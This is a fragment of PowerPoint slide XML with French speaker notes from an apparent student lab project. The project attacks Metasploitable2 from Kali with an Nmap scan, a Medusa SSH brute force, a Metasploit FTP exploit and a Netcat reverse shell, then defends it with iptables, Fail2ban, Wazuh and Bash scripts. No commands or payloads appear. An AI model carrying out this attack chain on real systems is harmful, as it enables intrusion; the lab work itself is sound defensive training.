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20"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="275" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="258" r:id="rId4"/>
    <p:sldId id="273" r:id="rId5"/>
    <p:sldId id="260" r:id="rId6"/>
    <p:sldId id="261" r:id="rId7"/>
    <p:sldId id="262" r:id="rId8"/>
    <p:sldId id="274" r:id="rId9"/>
    <p:sldId id="263" r:id="rId10"/>
    <p:sldId id="264" r:id="rId11"/>
    <p:sldId id="270" r:id="rId12"/>
    <p:sldId id="277" r:id="rId13"/>
    <p:sldId id="265" r:id="rId14"/>
    <p:sldId id="266" r:id="rId15"/>
    <p:sldId id="268" r:id="rId16"/>
    <p:sldId id="269" r:id="rId17"/>
    <p:sldId id="271" r:id="rId18"/>
    <p:sldId id="272" r:id="rId19"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6858000" cy="12192000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Cambria" panose="02040503050406030204" pitchFamily="18" charset="0"/>
      <p:regular r:id="rId21"/>
      <p:bold r:id="rId22"/>
      <p:italic r:id="rId23"/>
      <p:boldItalic r:id="rId24"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Georgia" panose="02040502050405020303" pitchFamily="18"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ty" initials="b" lastIdx="23" clrIdx="0">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="bet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DC08DB-221B-40F0-AD09-A6130FBDC090}" v="123" dt="2026-09-12T13:56:57.9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904" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="72" d="100"/>
          <a:sy n="72" d="100"/>
        </p:scale>
        <p:origin x="107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kaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}"/>
    <pc:docChg chg="custSel modSld">
      <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:57:37.413" v="159" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:35:06.406" v="93"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="257"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:33:43.225" v="71" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="257"/>
            <ac:spMk id="38" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modTransition">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:32:26.210" v="59"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="258"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:38:34.537" v="110"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="260"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:38:56.988" v="112"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="261"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:40:39.429" v="119"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="262"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:43:26.923" v="135"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="263"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:28:39.746" v="10" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="263"/>
            <ac:spMk id="193" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:43:41.736" v="137"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="264"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:28:47.799" v="14" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="264"/>
            <ac:spMk id="205" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:46:22.494" v="143"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2675499861" sldId="265"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:29:04.690" v="20" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2675499861" sldId="265"/>
            <ac:spMk id="220" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:46:51.634" v="144"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="268954873" sldId="266"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:29:09.217" v="22" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="268954873" sldId="266"/>
            <ac:spMk id="232" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:56:12.536" v="147"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="268"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:29:14.259" v="24" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="268"/>
            <ac:spMk id="287" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:56:37.400" v="148"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="269"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:29:19.812" v="26" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="269"/>
            <ac:spMk id="310" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:44:14.834" v="139"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="270"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:28:52.999" v="16" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="270"/>
            <ac:spMk id="312" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:56:57.985" v="149"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="271"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modTransition">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:42:14.970" v="131"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="272"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:37:33.286" v="104"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="273"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:43:02.151" v="133"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="274"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:27:31.711" v="8" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="274"/>
            <ac:spMk id="308" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp mod modTransition">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:57:37.413" v="159" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="275"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:57:37.413" v="159" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="275"/>
            <ac:spMk id="28" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:26:44.463" v="2" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="275"/>
            <ac:spMk id="38" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:26:48.442" v="3" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="275"/>
            <ac:spMk id="40" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:26:54.926" v="5" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="275"/>
            <ac:spMk id="42" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:27:00.694" v="6" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="275"/>
            <ac:spMk id="43" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modTransition">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:42:07.340" v="129"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="276"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modTransition modAnim">
        <pc:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:44:46.967" v="141"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="277"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Soukaina DOUAZI (ext)" userId="1b08e197-b0b6-45fa-bb36-57e4644637d0" providerId="ADAL" clId="{BE8132D3-EBE5-4BDB-84B7-E3229170A5D4}" dt="2026-09-12T13:29:00.270" v="18" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="0" sldId="277"/>
            <ac:spMk id="25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Voici le plan de ma présentation : je commencerai par l '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>introdution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> et l'architecture, puis le volet attaque, le volet défense, la supervision SIEM, les scripts d'automatisation, la validation complète du scénario, l'extension réalisée, les difficultés rencontrées, et enfin la conclusion.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Google Shape;3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sz="1100" dirty="0">
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Le problème fondamental : la détection manuelle est trop lente et trop dépendante de l'humain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1100" dirty="0">
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Ce qui nous amène à notre problématique : Comment détecter, bloquer et analyser automatiquement une cyberattaque en temps réel, sans intervention humaine ? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1100" dirty="0">
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Pour répondre à cette question, notre projet a 4 objectifs : simuler des attaques réelles, détecter via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1100" dirty="0" err="1">
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1100" dirty="0">
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> et scripts Bash, automatiser le blocage, et enrichir l'analyse par l'IA."</a:t>
            </a:r>
            <a:endParaRPr sz="1100" dirty="0">
              <a:highlight>
                <a:schemeClr val="lt1"/>
              </a:highlight>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Google Shape;66;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La plateforme repose sur trois machines virtuelles interconnectées sur un réseau privé isolé : Kali Linux comme attaquant, Metasploitable2 comme cible volontairement vulnérable, et un serveur </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> Manager qui joue le rôle de défenseur et de SIEM. Ce volet supervision </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> est un volet supplémentaire que j'ai ajouté au sujet initial.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lgn="l" rtl="0"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1600" dirty="0"/>
              <a:t>J’ai implanté quatre scenarios d’attaque : en premier j'ai utiliser un outil qui s'appel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1600" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1600" dirty="0"/>
              <a:t>, et qui scanne les machines pour trouver les ports ouverts : d'après le scan j'ai trouvé 26 ports dont ceux qui m intéresse sont les ports suivantes : 22 ;21 ;1524 . Grâce à ces derniers, je peux faciliter l'attaque.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Google Shape;13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dirty="0"/>
              <a:t> Il suffit de trouver le mot de passe SSH de la cible : pour cela, j'ai utilisé le brute force. Il existe plusieurs outils : j'ai utilisé Hydra mais il a échoué à cause d'un algorithme </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>tres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> ancien, alors que </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Medusa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> a réussi et a récupéré le mot de passe, comme le montre le log.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fr-FR" dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr lang="fr-FR" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Google Shape;14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Après avoir récupéré le mot de passe par brute force, je suis passé au troisième scénario : l'attaque du service FTP, qui acceptait les connexions anonymes, ce qui m'a permis d'y accéder sans mot de passe. Ensuite, j'ai utilisé </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> pour exploiter une faille connue de ce service FTP, et j'ai obtenu directement un accès avec les droits root.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="Google Shape;16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Après avoir obtenu un accès root via le FTP, j’ai passé au quatrième et dernier scénario : le reverse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>, c'est prendre le contrôle de la cible à distance depuis mon Kali, avec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>, ce qui m'a donné un accès à distance. Puis j'ai fait une escalade de privilèges pour passer en root comme administrateur. Les quatre volets d'attaque sont donc validés</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="295" name="Google Shape;29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Après ces attaques, j'ai mis en place des règles </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>iptables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> (c'est le pare-feu (firewall) de Linux) pour bloquer les ports 22, 21 et 1524 sur la machine victime. J'ai vérifié depuis Kali que chaque tentative de connexion échoue maintenant avec un timeout. J'ai aussi installé UFW comme protection supplémentaire.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;18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err="1"/>
              <a:t>iptables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> bloque les ports de façon fixe, mais je voulais aussi une protection automatique et ciblée contre le brute force. Pour ça, j'ai utilisé Fail2ban, c'est un outil qui bloque automatiquement les adresses IP qui essaient de se connecter trop de fois. Il surveille le fichier auth.log en temps réel.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="197" name="Google Shape;19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lgn="just" rtl="0"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Fail2ban était actif, mais sans ban enregistré — aucune preuve qu'il fonctionnait. J'ai donc développé trois scripts Bash :  : un qui détecte les IP suspectes, un qui les bloque automatiquement avec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>iptables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, et un qui fait l'audit du système.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="fr-FR" dirty="0"/>
            </a:br>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="293" name="Google Shape;29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fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>  Mes trois scripts ont été testés et validés en conditions réelles. detect_attack.sh a détecté l'IP suspecte avec ses tentatives, react_block.sh l'a bloquée automatiquement, et audit.sh a donné la liste des ports ouverts sur la machine  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="fr-FR" dirty="0"/>
            </a:br>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="236" name="Google Shape;23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sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
